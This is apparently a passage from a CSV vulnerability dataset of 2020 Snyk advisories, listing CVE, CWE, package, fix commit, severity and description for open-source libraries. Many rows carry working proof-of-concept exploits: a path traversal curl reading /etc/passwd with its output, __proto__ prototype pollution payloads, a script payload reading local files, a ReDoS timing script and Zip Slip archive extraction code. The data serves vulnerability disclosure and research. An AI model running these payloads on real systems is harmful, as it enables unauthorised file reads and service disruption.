Affected versions of this package are vulnerable to Path Traversal. User input flowing from the workspace endpoint gets used to create a file path filePath and this is fetched and then sent back to a user. This can be escaped to fetch arbitrary files from a server.
Note
This package no longer releases fixes to npm but a fixed version tag 1.40.2-chrome-stable is available if this package is loaded from GitHub.
PoC
run docker run -p 3000:3000 browserless/chrome

snoopy@snoopy-XPS-15-9570:~$ curl --path-as-is --url 'http://localhost:3000/workspace/../../../../../../../../../../../../../../../../etc/passwd&#39;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",2020
CVE-2020-7752,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-SYSTEMINFORMATION-1021909,26/10/2020,25/10/2020,https://github.com/sebhildebrandt/systeminformation/commit/931fecaec2c1a7dcc10457bb8cd552d08089da61,Command Injection,https://api.github.com/repos/sebhildebrandt/systeminformation/commits/931fecaec2c1a7dcc10457bb8cd552d08089da61,Sebastian Hildebrandt,hildebrandt@plus-innovations.com,systeminformation,931fecaec2c1a7dcc10457bb8cd552d08089da61,inetChecksite() fixed vulnerability: command injection,Markdown,8.8,high,"systeminformation is a simple system and OS information library.
Affected versions of this package are vulnerable to Command Injection. This package is vulnerable to Command Injection. The attacker can concatenate curl's parameters to overwrite Javascript files and then execute any OS commands.",2020
CVE-2020-7751,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PATHVAL-596926,25/10/2020,30/07/2020,https://github.com/chaijs/pathval/commit/7859e0e1ce4c2c67de897edce097ed31f80661d0,Prototype Pollution,https://api.github.com/repos/chaijs/pathval/commits/7859e0e1ce4c2c67de897edce097ed31f80661d0,Keith Cirkel,keithamus@users.noreply.github.com,pathval,7859e0e1ce4c2c67de897edce097ed31f80661d0,"Merge pull request #60 from deleonio/fix/vulnerability-prototype-pollution

Fix Vulnerability - Ready",Unknown,6.0,medium,"pathval is an Object value retrieval given a string path
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
var pathval = require('pathval');

var obj = {};
pathval.setPathValue(obj, 'proto.polluted', true);
console.log(polluted); // true",2020
CVE-2020-7750,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-SCRATCHSVGRENDERER-1020497,22/10/2020,21/10/2020,https://github.com/LLK/scratch-svg-renderer/commit/9ebf57588aa596c4fa3bb64209e10ade395aee90,Cross-site Scripting (XSS),https://api.github.com/repos/LLK/scratch-svg-renderer/commits/9ebf57588aa596c4fa3bb64209e10ade395aee90,picklesrus,picklesrus@users.noreply.github.com,scratch-svg-renderer,9ebf57588aa596c4fa3bb64209e10ade395aee90,"Merge pull request #179 from LLK/hotfix/purify-just-in-time

[develop] Merge hotfix back into develop",Config files,9.6,critical,"scratch-svg-renderer is a SVG renderer for Scratch
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The loadString function does not escape SVG properly, which can be used to inject arbitrary elements into the DOM via the _transformMeasurements function.",2020
CVE-2020-7748,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TSEDCORE-1019382,19/10/2020,19/10/2020,https://github.com/TypedProject/tsed/commit/1395773ddac35926cf058fc6da9fb8e82266761b,Prototype Pollution,https://api.github.com/repos/TypedProject/tsed/commits/1395773ddac35926cf058fc6da9fb8e82266761b,Romain Lenzotti,rom.lenzotti@gmail.com,tsed,1395773ddac35926cf058fc6da9fb8e82266761b,fix: Use objectKeys to prevent prototype pollution,TypeScript,5.6,medium,"@tsed/core is a package of Ts.ED framework.
Affected versions of this package are vulnerable to Prototype Pollution. This vulnerability relates to the deepExtend function which is used as part of the utils directory. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
import {deepExtends} from ""../../src"";

var payload = JSON.parse('{""proto"": {""a"": ""vulnerable""}}');
let result = deepExtends( { security: [{""1"": ""o""}]},payload)
console.log(result);
console.log({}.a);",2020
CVE-2020-7764,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-JS-FINDMYWAY-1038269,08/11/2020,03/11/2020,https://github.com/delvedor/find-my-way/commit/ab408354690e6b9cf3c4724befb3b3fa4bb90aac,Web Cache Poisoning,https://api.github.com/repos/delvedor/find-my-way/commits/ab408354690e6b9cf3c4724befb3b3fa4bb90aac,Tomas Della Vedova,delvedor@users.noreply.github.com,find-my-way,ab408354690e6b9cf3c4724befb3b3fa4bb90aac,Enable versioning on demand (#172),Markdown,5.9,medium,"Affected versions of this package are vulnerable to Web Cache Poisoning. It accepts the Accept-Version header by default, and if versioned routes are not being used, this could lead to a denial of service. Accept-Version can be used as an unkeyed header in a cache poisoning attack.",2020
CVE-2020-7765,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324,09/11/2020,27/10/2020,https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,Prototype Pollution,https://api.github.com/repos/firebase/firebase-js-sdk/commits/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,Feiyang,feiyangc@google.com,firebase-js-sdk,9cf727fcc3d049551b16ae0698ac33dc2fe45ada,"Prevent __proto__ pollution in util.deepExtend (#4001)

* do not extend __proto__

* replace asserts with expects

* Create fuzzy-impalas-brake.md

* address comment",Markdown,5.6,medium,"@firebase/util is a wrapper of some Webchannel Features for the Firebase JS SDK.
Affected versions of this package are vulnerable to Prototype Pollution. This vulnerability relates to the deepExtend function within the DeepCopy.ts file. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
const util = require('@firebase/util');
var payload = JSON.parse('{""__proto__"": {""polluted"": ""vulnerable""}}');

const a = {
    nest: {
      number: 1,
      string: '1',
      object: { key: '1' },
      date: new Date(1),
      nest: {
        a: 1
      }
    },
  };
var result = util.deepExtend(a,payload);
console.log({}.polluted);",2020
CVE-2020-7762,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSREPORTCHROMEPDF-1037310,05/11/2020,05/11/2020,https://github.com/jsreport/jsreport-chrome-pdf/commit/6750b2f77d05cb843aefc1c4a98097a3bd33a6a2,Arbitrary File Read,https://api.github.com/repos/jsreport/jsreport-chrome-pdf/commits/6750b2f77d05cb843aefc1c4a98097a3bd33a6a2,BJR Matos,bjrmatos@gmail.com,jsreport-chrome-pdf,6750b2f77d05cb843aefc1c4a98097a3bd33a6a2,block file requests,JavaScript,6.5,medium,"jsreport-chrome-pdf is a 
Affected versions of this package are vulnerable to Arbitrary File Read.
An Arbitrary File Read vulnerability exists in lib/conversion.js.
PoC
<script>document.write(window.location='../../../../../etc/passwd')</script>",2020
CVE-2020-7774,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-Y18N-1021887,10/11/2020,25/10/2020,https://github.com/yargs/y18n/commit/a9ac604abf756dec9687be3843e2c93bfe581f25,Prototype Pollution,https://api.github.com/repos/yargs/y18n/commits/a9ac604abf756dec9687be3843e2c93bfe581f25,Benjamin E. Coe,bencoe@google.com,y18n,a9ac604abf756dec9687be3843e2c93bfe581f25,fix: address prototype pollution issue (#108),TypeScript,7.3,high,"y18n is a the bare-bones internationalization library used by yargs
Affected versions of this package are vulnerable to Prototype Pollution due to improper sanitization.",2020
CVE-2020-7761,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-ABSOLUNETKAFE-1017403,05/11/2020,14/10/2020,https://github.com/absolunet/kafe/commit/c644c798bfcdc1b0bbb1f0ca59e2e2664ff3fdd0#diff-f0f4b5b19ad46588ae9d7dc1889f681252b0698a4ead3a77b7c7d127ee657857,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/absolunet/kafe/commits/c644c798bfcdc1b0bbb1f0ca59e2e2664ff3fdd0#diff-f0f4b5b19ad46588ae9d7dc1889f681252b0698a4ead3a77b7c7d127ee657857,Jb Landry,jb@jblandry.info,kafe,c644c798bfcdc1b0bbb1f0ca59e2e2664ff3fdd0,Switch email pattern to practical implementation of RFC 5322,JavaScript,5.3,medium,"@absolunet/kafe is a Javascript utility library.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It allows cause a denial of service when validating crafted invalid emails.",2020
CVE-2020-7763,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-PHANTOMHTMLTOPDF-1023598,05/11/2020,29/10/2020,https://github.com/pofider/phantom-html-to-pdf/commit/b5d2da2639a49a95e0bdb3bc0c987cb6406b8259,Arbitrary File Read,https://api.github.com/repos/pofider/phantom-html-to-pdf/commits/b5d2da2639a49a95e0bdb3bc0c987cb6406b8259,pofider,honza.pofider@seznam.cz,phantom-html-to-pdf,b5d2da2639a49a95e0bdb3bc0c987cb6406b8259,fix access to files without protocol,JavaScript,7.5,high,"phantom-html-to-pdf is a Convert html to pdf using phantomjs
Affected versions of this package are vulnerable to Arbitrary File Read.
PoC
var fs = require('fs')
var conversion = require(""phantom-html-to-pdf"")();
conversion.allowLocalFilesAccess = false
conversion({ html: ""document.write(window.location='c:/windows/win.ini')"" }, function(err, pdf) {
var output = fs.createWriteStream('output.pdf')
console.log(pdf.logs);
console.log(pdf.numberOfPages);
pdf.stream.pipe(output);
});",2020
CVE-2020-7770,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSON8-1017116,03/11/2020,13/10/2020,https://github.com/sonnyp/JSON8/commit/2e890261b66cbc54ae01d0c79c71b0fd18379e7e,Prototype Pollution,https://api.github.com/repos/sonnyp/JSON8/commits/2e890261b66cbc54ae01d0c79c71b0fd18379e7e,Sonny Piers,sonny@fastmail.net,JSON8,2e890261b66cbc54ae01d0c79c71b0fd18379e7e,json8-merge-patch: Prevent prototype pollution 2 (#116),Markdown,7.3,high,"json8 is a JSON toolkit for JavaScript
Affected versions of this package are vulnerable to Prototype Pollution. The function adds in the target object the property specified in the path, however it does not properly check the key being set, leading to a prototype pollution.",2020
CVE-2020-7760,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-CODEMIRROR-1016937,30/10/2020,09/10/2020,https://github.com/codemirror/CodeMirror/commit/55d0333907117c9231ffdf555ae8824705993bbb,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/codemirror/CodeMirror/commits/55d0333907117c9231ffdf555ae8824705993bbb,Marijn Haverbeke,marijn@haverbeke.nl,CodeMirror,55d0333907117c9231ffdf555ae8824705993bbb,[javascript mode] Fix potentially-exponential regexp,JavaScript,5.3,medium,"codemirror is a versatile text editor implemented in JavaScript for the browser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerable regular expression is located in https://github.com/codemirror/CodeMirror/blob/cdb228ac736369c685865b122b736cd0d397836c/mode/javascript/javascript.js#L129. The ReDOS vulnerability of the regex is mainly due to the sub-pattern (\s|/\*.*?\*/)*",2020
CVE-2020-15250,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-JUNIT-1017047,13/10/2020,12/10/2020,https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec22521627dbc52ae,Information Exposure,https://api.github.com/repos/junit-team/junit4/commits/610155b8c22138329f0723eec22521627dbc52ae,Marc Philipp,mail@marcphilipp.de,junit4,610155b8c22138329f0723eec22521627dbc52ae,"Merge pull request from GHSA-269g-pwp5-87pp

When running on Java 7 or later, temporary directories are now created
Using Java’s NIO API which restricts permissions to owner-only by
default.",Java,2.9,low,"junit:junit is an unit testing framework for Java
Affected versions of this package are vulnerable to Information Exposure. The JUnit4 test rule TemporaryFolder contains a local information disclosure vulnerability. On Unix like systems, the system's temporary directory is shared between all users on that system. Because of this, when files and directories are written into this directory they are, by default, readable by other users on that same system.
Note: This vulnerability does not allow other users to overwrite the contents of these directories or files.
This only affects Unix like systems.",2020
CVE-2020-7743,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MATHJS-1016401,13/10/2020,07/10/2020,https://github.com/josdejong/mathjs/commit/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,Prototype Pollution,https://api.github.com/repos/josdejong/mathjs/commits/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,Jos de Jong,wjosdejong@gmail.com,mathjs,ecb80514e80bce4e6ec7e71db8ff79954f07c57e,Fix object pollution vulnerability in `math.config`,Markdown,7.3,high,"mathjs is a math library for JavaScript and Node.js. It features a flexible expression parser with support for symbolic computation, comes with a large set of built-in functions and constants, and offers an integrated solution to work with diff.
Affected versions of this package are vulnerable to Prototype Pollution via the deepExtend function that runs upon configuration updates.",2020
CVE-2020-7741,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-HELLOJS-1014546,06/10/2020,30/09/2020,https://github.com/MrSwitch/hello.js/commit/d6f5137f30de6e0ef7048191ee6ae575fdc2f669,Cross-site Scripting (XSS),https://api.github.com/repos/MrSwitch/hello.js/commits/d6f5137f30de6e0ef7048191ee6ae575fdc2f669,Andrew Dodson,andrew@5app.com,hello.js,d6f5137f30de6e0ef7048191ee6ae575fdc2f669,fix(xss): oauth_redirect should be a valid url,JavaScript,9.9,critical,"hellojs is a Javascript RESTFUL API library for connecting with OAuth2 services.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The code gets the param oauth_redirect from url and passes it to location.assign without any sanitisation. So an attack can pass js payloads into the url param oauth_redirect, such as javascript:alert(1).",2020
CVE-2020-7736,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664,02/10/2020,14/08/2020,https://github.com/b-heilman/bmoor/commit/7d4a086a1dc3ef11ed0b323824d02348734b7da5,Prototype Pollution,https://api.github.com/repos/b-heilman/bmoor/commits/7d4a086a1dc3ef11ed0b323824d02348734b7da5,Brian Heilman,brian.heilman@gmail.com,bmoor,7d4a086a1dc3ef11ed0b323824d02348734b7da5,fix: prototype pollution,Config files,7.3,high,"bmoor is an A basic foundation for other libraries, establishing useful patterbs, and letting them be more.
Affected versions of this package are vulnerable to Prototype Pollution via the set function.
POC:
const bmoor = require('bmoor');
bmoor.set({}, """"__proto__.polluted"""", true);
console.log(polluted);",2020
CVE-2020-7735,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NGPACKAGR-1012427,25/09/2020,24/09/2020,https://github.com/ng-packagr/ng-packagr/commit/bda0fff3443301f252930a73fdc8fb9502de596d,Command Injection,https://api.github.com/repos/ng-packagr/ng-packagr/commits/bda0fff3443301f252930a73fdc8fb9502de596d,Alan Agius,alan.agius4@gmail.com,ng-packagr,bda0fff3443301f252930a73fdc8fb9502de596d,fix: replace execFile with execFileSync to fix a potential malicious cmd injection,Unknown,6.6,medium,"ng-packagr is a Compile and package a TypeScript library to Angular Package Format
Affected versions of this package are vulnerable to Command Injection via the styleIncludePaths option.",2020
CVE-2020-7733,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-610226,16/09/2020,09/09/2020,https://github.com/faisalman/ua-parser-js/commit/233d3bae22a795153a7e6638887ce159c63e557d,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faisalman/ua-parser-js/commits/233d3bae22a795153a7e6638887ce159c63e557d,Faisal Salman,f@faisalman.com,ua-parser-js,233d3bae22a795153a7e6638887ce159c63e557d,Fix potential ReDoS vulnerability,JavaScript,7.5,high,"ua-parser-js is a lightweight JavaScript-based user-agent string parser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.
POC by Yeting Li
var blank = "" "";
for (let i = 1; i < 5000; i++) {
blank = blank + "" "";
}

str_mi = ""android1mipad"" + blank + ""!"";
str_mi = str_mi + +blank + ""!"";
mi = /android.+(mi[s-]*(?:pad)(?:[s]*[ws]+))s+build/i;
var count_mi = 0;
for (let i = 0; i < 10; i++) {
var time = Date.now();
mi.test(str_mi);
var len = Date.now() - time;
count_mi = count_mi + len;
console.log(""mi:"" + blank.length + "": "" + len)
}
console.log(count_mi / 10);
str_redmi = ""android1redminote"" + blank + ""!"";
redmi = /android.+(redmi[s-]*(?:note)?(?:[s]*[ws]+))s+build/i;
var count_redmi = 0;
for (let i = 0; i < 10; i++) {
var time = Date.now();
redmi.test(str_redmi);
var len = Date.now() - time;
count_redmi = count_redmi + len;
console.log(""redmi:"" + blank.length + "": "" + len)
}
console.log(count_redmi / 10);",2020
CVE-2020-7731,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMRUSSELLHAERINGGOSAML2-608302,07/09/2020,07/09/2020,https://github.com/russellhaering/goxmldsig/commit/ca2b448c7d79c51361a5f329bf537c12ffc8429d,Denial of Service (DoS),https://api.github.com/repos/russellhaering/goxmldsig/commits/ca2b448c7d79c51361a5f329bf537c12ffc8429d,Tom Hanson,tom@aporcupine.com,goxmldsig,ca2b448c7d79c51361a5f329bf537c12ffc8429d,Explicitly check for case where SignatureValue is nil,Go,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS). There is a crash on nil-pointer dereference caused by sending malformed XML signatures.,2020
CVE-2020-7730,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-BESTZIP-609371,02/09/2020,02/09/2020,https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,Command Injection,https://api.github.com/repos/nfriedly/node-bestzip/commits/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,Nathan Friedly,nathan@nfriedly.com,node-bestzip,45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,"prevent shell command injection

switch from cp.exec to cp.spawn to prevent shell command injection.

Use path-expansion logic from nodeZip in nativeZip to maintain feature parity without any vulnerability.",JavaScript,9.8,critical,"bestzip is an Uses OS zip command if avaliable (for better performance and speed) or node.js version if there is no system command avaliable. Can be called via node or command line.
Affected versions of this package are vulnerable to Command Injection via the options param.",2020
CVE-2020-7666,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGCPIO-570440,01/09/2020,01/09/2020,https://github.com/u-root/u-root/commit/c995e6bd559a7b1bf642e4d418a75660f41920a9,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/u-root/u-root/commits/c995e6bd559a7b1bf642e4d418a75660f41920a9,Ryan O'Leary,ryanoleary@google.com,u-root,c995e6bd559a7b1bf642e4d418a75660f41920a9,"Fix zipslips for cpio, tar and zip

Fixes the following CVEs:

* CVE-2020-7669
* CVE-2020-7666
* CVE-2020-7665

A zipslip is when a archive contains a path which escapes the extract
directory. This can be done with absolute paths `/` or with parent
directories `..`. It is a security problem.

These commands will no longer extract those directories and instead
print a warning.

Signed-off-by: Ryan O'Leary <ryanoleary@google.com>",Go,7.5,high,"github.com/u-root/u-root/pkg/cpio is a package that provides Go versions of standard Linux tools and bootloaders. It also provides tools for compiling Go programs in a single binary and creating initramfs images.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is vulnerable to leading, non-leading relative path traversal attacks and symlink based (relative and absolute) path traversal attacks in cpio file extraction.
PoC
// poc.go:
package main

import (
    ""io""
    ""log""
    ""os""
    ""github.com/u-root/u-root/pkg/cpio""
)
func main() {
    archiver, err := cpio.Format(""newc"")
    if err != nil {
        log.Fatalf(""Format -H newc not supported: %v"", err)
    }
var inums map[uint64]string
inums = make(map[uint64]string)

rr := archiver.Reader(os.Stdin)
for {
    rec, err := rr.ReadRecord()
    if err == io.EOF {
        break
    }
    if err != nil {
        log.Fatalf(&quot;error reading records: %v&quot;, err)
    }

    if rec.Info.FileSize == 0 {
        if _, ok := inums[rec.Info.Ino]; ok {
            err := os.Link(inums[rec.Info.Ino], rec.Name)
            if err != nil {
                log.Fatal(err)
            }
            continue
        }
    }
    inums[rec.Info.Ino] = rec.Name
    if err := cpio.CreateFile(rec); err != nil {
        log.Printf(&quot;Creating %q failed: %v&quot;, rec.Name, err)
    }
}

}


Build the executable go build poc.go
Run ./poc < archive.cpio
with ""archive.cpio"" being a cpio archive that includes at least one of the following:


file with filepath that uses  leading or non-leading ""../"" 
file symlink that point outside of the current directory (relative or absolute)
directory symlink that point outside of the current directory (relative or absolute) followed by a file under that directory",2020
CVE-2020-7669,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGTARUTIL-570428,01/09/2020,01/09/2020,https://github.com/u-root/u-root/commit/c995e6bd559a7b1bf642e4d418a75660f41920a9,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/u-root/u-root/commits/c995e6bd559a7b1bf642e4d418a75660f41920a9,Ryan O'Leary,ryanoleary@google.com,u-root,c995e6bd559a7b1bf642e4d418a75660f41920a9,"Fix zipslips for cpio, tar and zip

Fixes the following CVEs:

* CVE-2020-7669
* CVE-2020-7666
* CVE-2020-7665

A zipslip is when a archive contains a path which escapes the extract
directory. This can be done with absolute paths `/` or with parent
directories `..`. It is a security problem.

These commands will no longer extract those directories and instead
print a warning.

Signed-off-by: Ryan O'Leary <ryanoleary@google.com>",Go,7.5,high,"github.com/u-root/u-root/pkg/tarutil is a package that provides Go versions of standard Linux tools and bootloaders. It also provides tools for compiling Go programs in a single binary and creating initramfs images.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is vulnerable to both leading and non-leading relative path traversal attacks in tar file extraction.
PoC
package main

import (
    ""os""
    ""fmt""
    tar ""github.com/u-root/u-root/pkg/tarutil""
)
func main() {
    file := ""relative.tar""
    f, err := os.Open(file)
    if err != nil {
        fmt.Println(err)
    }
    defer f.Close()
if err := tar.ExtractDir(f, &quot;.&quot;); err != nil {
    fmt.Println(err)
}

}

with ""relative.tar"" being a tar archive that includes a file with filepath that uses  leading or non-leading ""../"" .",2020
CVE-2020-7665,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGUZIP-570441,01/09/2020,01/09/2020,https://github.com/u-root/u-root/commit/c995e6bd559a7b1bf642e4d418a75660f41920a9,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/u-root/u-root/commits/c995e6bd559a7b1bf642e4d418a75660f41920a9,Ryan O'Leary,ryanoleary@google.com,u-root,c995e6bd559a7b1bf642e4d418a75660f41920a9,"Fix zipslips for cpio, tar and zip

Fixes the following CVEs:

* CVE-2020-7669
* CVE-2020-7666
* CVE-2020-7665

A zipslip is when a archive contains a path which escapes the extract
directory. This can be done with absolute paths `/` or with parent
directories `..`. It is a security problem.

These commands will no longer extract those directories and instead
print a warning.

Signed-off-by: Ryan O'Leary <ryanoleary@google.com>",Go,7.5,high,"github.com/u-root/u-root/pkg/uzip is a package that provides Go versions of standard Linux tools and bootloaders. It also provides tools for compiling Go programs in a single binary and creating initramfs images.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is vulnerable to both leading and non-leading relative path traversal attacks in zip file extraction.
PoC
package main

import (
    ""fmt""
    uzip ""github.com/u-root/u-root/pkg/uzip""
)
func main() {
    file := ""relative.zip""
err := uzip.FromZip(file, &quot;.&quot;)
if err != nil {
fmt.Println(err)
}

}

with ""relative.zip"" being a zip archive that includes a file with filepath that uses  leading or non-leading ""../"" .",2020
CVE-2020-7706,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONNIELANG-598853,19/08/2020,17/08/2020,https://github.com/mattinsler/connie-lang/commit/ef376d404c712dd28309ba07f28a8f87f24a015a,Prototype Pollution,https://api.github.com/repos/mattinsler/connie-lang/commits/ef376d404c712dd28309ba07f28a8f87f24a015a,Matt Insler,mattinsler@users.noreply.github.com,connie-lang,ef376d404c712dd28309ba07f28a8f87f24a015a,"added security tests, changed to yarn, bump version",JavaScript,7.5,high,"connie-lang is a the configuration language for connie.
Affected versions of this package are vulnerable to Prototype Pollution in the configuration language library used by connie.
POC
const connie = require('connie');
const fs = require('fs');
fs.writeFileSync('test.json', `{""__proto__"": {""polluted"": true}}`);
connie('dir', '.').read().then(x => {
    console.log(polluted);
});",2020
CVE-2020-7729,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-GRUNT-597546,20/08/2020,07/08/2020,https://github.com/gruntjs/grunt/commit/e350cea1724eb3476464561a380fb6a64e61e4e7,Arbitrary Code Execution,https://api.github.com/repos/gruntjs/grunt/commits/e350cea1724eb3476464561a380fb6a64e61e4e7,Vlad Filippov,vlad.filippov@gmail.com,grunt,e350cea1724eb3476464561a380fb6a64e61e4e7,"Switch to use `safeLoad` for loading YML files via `file.readYAML`.

For previous behaviour please use the following:

```
readYAML('test/fixtures/utf8.yaml', null, {unsafeLoad: true});
```",JavaScript,7.1,high,"grunt is a JavaScript task runner.
Affected versions of this package are vulnerable to Arbitrary Code Execution due to the default usage of the function load() instead of its secure replacement safeLoad() of the package js-yaml inside grunt.file.readYAML.",2020
CVE-2020-7704,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674,19/08/2020,14/08/2020,https://github.com/piranna/linux-cmdline/commit/53c61a88bc47eb25d71832205056beaab95cf677,Prototype Pollution,https://api.github.com/repos/piranna/linux-cmdline/commits/53c61a88bc47eb25d71832205056beaab95cf677,Jesús Leganés-Combarro 'piranna,piranna@gmail.com,linux-cmdline,53c61a88bc47eb25d71832205056beaab95cf677,[fix] Don't pollute prototype,JavaScript,7.5,high,"linux-cmdline is a Parser for the Linux kernel command line arguments
Affected versions of this package are vulnerable to Prototype Pollution via the constructor.
POC:
const linuxCmdline = require('linux-cmdline');
linuxCmdline('__proto__.polluted=true');
console.log(polluted);",2020
CVE-2020-7707,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROPERTYEXPR-598800,19/08/2020,17/08/2020,https://github.com/jquense/expr/commit/df846910915d59f711ce63c1f817815bceab5ff7,Prototype Pollution,https://api.github.com/repos/jquense/expr/commits/df846910915d59f711ce63c1f817815bceab5ff7,Jason Quense,monastic.panic@gmail.com,expr,df846910915d59f711ce63c1f817815bceab5ff7,fix: prototype polution vector,JavaScript,9.8,critical,"property-expr is a tiny util for getting and setting deep object props safely
Affected versions of this package are vulnerable to Prototype Pollution via the setter function.
POC
var expr = require('property-expr');
expr.setter('__proto__.polluted')({}, true);
console.log(polluted); // true",2020
CVE-2020-7722,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEEUTILS-598679,01/09/2020,14/08/2020,https://github.com/nodee-apps/utils/commit/52460d936c52f03c9907bc99ac5e890970cef83c,Prototype Pollution,https://api.github.com/repos/nodee-apps/utils/commits/52460d936c52f03c9907bc99ac5e890970cef83c,Matus Szabo,matus.szabo@gmail.com,utils,52460d936c52f03c9907bc99ac5e890970cef83c,fixed: object deepSet,JavaScript,7.5,high,"nodee-utils is a set of useful helpers
Affected versions of this package are vulnerable to Prototype Pollution via the deepSet function.
POC:
const { object } = require('nodee-utils');
object.deepSet({}, '__proto__.polluted', true);
console.log(polluted);",2020
CVE-2020-7715,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666,01/09/2020,14/08/2020,https://github.com/acstll/deep-get-set/commit/a127e65bc77ff5707a6a103819e140d11475c5f4,Prototype Pollution,https://api.github.com/repos/acstll/deep-get-set/commits/a127e65bc77ff5707a6a103819e140d11475c5f4,Arturo Castillo Delgado,arturo@arturu.com,deep-get-set,a127e65bc77ff5707a6a103819e140d11475c5f4,"Merge pull request #4 from 418sec/master

Security Fix for Prototype Pollution - huntr.dev",JavaScript,7.5,high,"deep-get-set is a Set and get values on objects via dot-notation strings.
Affected versions of this package are vulnerable to Prototype Pollution via the main function.
POC:
const deep = require('deep-get-set');
deep({}, ['__proto__', 'polluted'], true);
console.log(polluted);",2020
CVE-2020-7717,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOTNOTES-598668,01/09/2020,14/08/2020,https://github.com/whitfin/dot-notes-js/commit/9eda37e50e442bc36d501e922e59dd7f153722e6,Prototype Pollution,https://api.github.com/repos/whitfin/dot-notes-js/commits/9eda37e50e442bc36d501e922e59dd7f153722e6,huntr.dev | protect open source software,security@huntr.dev,dot-notes-js,9eda37e50e442bc36d501e922e59dd7f153722e6,Block prototype keywords from key paths (#5),JavaScript,7.5,high,"dot-notes is a Two way conversions between objects and dot/bracket notation
Affected versions of this package are vulnerable to Prototype Pollution via the create function.
POC:
const dots = require('dot-notes');
dots.create({}, '__proto__.polluted', true);
console.log(polluted);",2020
CVE-2020-7696,CWE-255,Snyk,https://security.snyk.io/vuln/SNYK-JS-REACTNATIVEFASTIMAGE-572228,13/07/2020,12/06/2020,https://github.com/DylanVann/react-native-fast-image/commit/4a7cd64f5b0aa40b04d63ccb105ee2b511abe624,Information Exposure,https://api.github.com/repos/DylanVann/react-native-fast-image/commits/4a7cd64f5b0aa40b04d63ccb105ee2b511abe624,DreamPiggy,lizhuoli1126@126.com,react-native-fast-image,4a7cd64f5b0aa40b04d63ccb105ee2b511abe624,"feat(ios): allow for for per-image-request-headers (#691)

* Bump the dependency of SDWebImage into 5.8+ because of the SDWebImageDownloaderRequestModifier convenient API usage
* Fix the implementation on iOS for per-image-request-header-setup. Should not use `SDWebImageDownloader` which manage the global shared headers. Use the context option of request modifier.
* Add the support for data:image URL for WebP images
* Alaways bypass invalid SSL certificate error, same behavior like React-Native itself
* Fix the implementation of request modifier on SDWebImage, which have bugs on 5.8.0 (will fix in 5.8.1), revert the dependency bump
* Revert the changes to bypass SSL error
* Remove the unused Podfile.lock changes",Unknown,5.3,medium,"react-native-fast-image is a FastImage, performant React Native image component.
